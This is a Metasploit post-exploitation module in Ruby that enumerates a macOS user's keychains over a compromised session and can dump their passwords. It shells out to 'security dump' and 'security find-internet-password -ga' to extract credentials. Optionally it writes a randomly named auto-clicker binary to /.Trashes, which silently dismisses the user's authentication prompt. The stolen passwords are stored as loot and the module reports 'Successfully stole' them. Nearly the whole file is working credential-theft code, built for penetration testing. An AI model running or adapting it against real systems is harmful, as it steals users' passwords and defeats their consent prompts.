##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::OSX::System
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Keychain Enumeration',
      'Description'   => %q{
        This module presents a way to quickly go through the current user's keychains and
        collect data such as email accounts, servers, and other services.  Please note:
        when using the GETPASS and GETPASS_AUTO_ACCEPT option, the user may see an authentication
        alert flash briefly on their screen that gets dismissed by a programmatically triggered click.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'ipwnstuff <e[at]ipwnstuff.com>', 'joev' ],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))

    register_options(
      [
        OptBool.new('GETPASS', [false, 'Collect passwords.', false]),
        OptBool.new('GETPASS_AUTO_ACCEPT', [false, 'Attempt to auto-accept any prompts when collecting passwords.', true]),
        OptInt.new('GETPASS_TIMEOUT', [false, 'Maximum time to wait on all passwords to be dumped.', 999999]),
        OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
      ])
  end

  def list_keychains
    keychains = cmd_exec("security list")
    user = cmd_exec("whoami")
    print_status("The following keychains for #{user.strip} were found:")
    print_line(keychains.chomp)
    return keychains =~ /No such file or directory/ ? nil : keychains
  end

  def enum_accounts(keychains)
    user =  cmd_exec("whoami").chomp
    out = cmd_exec("security dump | egrep 'acct|desc|srvr|svce'")

    accounts = []

    out.split("\n").each do |line|
      unless line =~ /NULL/
        case line
        when /\"acct\"/
          accounts << Hash.new
          accounts.last["acct"] = line.split('<blob>=')[1].split('"')[1]
        when /\"srvr\"/
          accounts.last["srvr"] = line.split('<blob>=')[1].split('"')[1]
        when /\"svce\"/
          accounts.last["svce"] = line.split('<blob>=')[1].split('"')[1]
        when /\"desc\"/
          accounts.last["desc"] = line.split('<blob>=')[1].split('"')[1]
        end
      end
    end

    accounts
  end

  def get_passwords(accounts)
    (1..accounts.count).each do |num|
      if accounts[num].has_key?("srvr")
        c = 'find-internet-password'
        s = accounts[num]["srvr"]
      else
        c = 'find-generic-password'
        s = accounts[num]["svce"]
      end

      cmd = cmd_exec("security #{c} -ga \"#{accounts[num]["acct"]}\" -s \"#{s}\" 2>&1")

      cmd.split("\n").each do |line|
        if line =~ /password: /
          unless line.split()[1].nil?
            accounts[num]["pass"] = line.split()[1].gsub("\"","")
          else
            accounts[num]["pass"] = nil
          end
        end
      end
    end
    return accounts
  end


  def save(data, kind='Keychain information')
    l = store_loot('macosx.keychain.info',
      'plain/text',
      session,
      data,
      'keychain_info.txt',
      'Mac Keychain Account/Server/Service/Description')

    print_good("#{@peer} - #{kind} saved in #{l}")
  end

  def run
    @peer = "#{session.session_host}:#{session.session_port}"

    keychains = list_keychains
    if keychains.nil?
      print_error("#{@peer} - Module timed out, no keychains found.")
      return
    end

    user = cmd_exec("/usr/bin/whoami").chomp
    accounts = enum_accounts(keychains)
    save(accounts)

    if datastore['GETPASS']
      if (datastore['GETPASS_AUTO_ACCEPT'])
        print_status("Writing auto-clicker to `#{clicker_file}'")
        write_file(clicker_file, clicker_bin)
        register_file_for_cleanup(clicker_file)

        print_status('Dumping keychain with auto-clicker...')
        passwords = cmd_exec("chmod +x #{clicker_file} && #{clicker_file}", nil, datastore['GETPASS_TIMEOUT'])
        save(passwords, 'Plaintext passwords')

        begin
          count = JSON.parse(passwords).count
          print_good("Successfully stole #{count} passwords")
        rescue JSON::ParserError => e
          print_error("Response was not valid JSON")
        end
      else
        begin
          passwords = get_passwords(accounts)
        rescue
          print_error("#{@peer} - Module timed out, no passwords found.")
          print_error("#{@peer} - This is likely due to the host not responding to the prompt.")
        end
        save(passwords)
      end
    end
  end

  def clicker_file
    @clicker_file ||=
      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}"
  end

  def clicker_bin
    File.read(File.join(
      Msf::Config.data_directory, 'exploits', 'osx', 'dump_keychain', 'dump'
    ))
  end


end
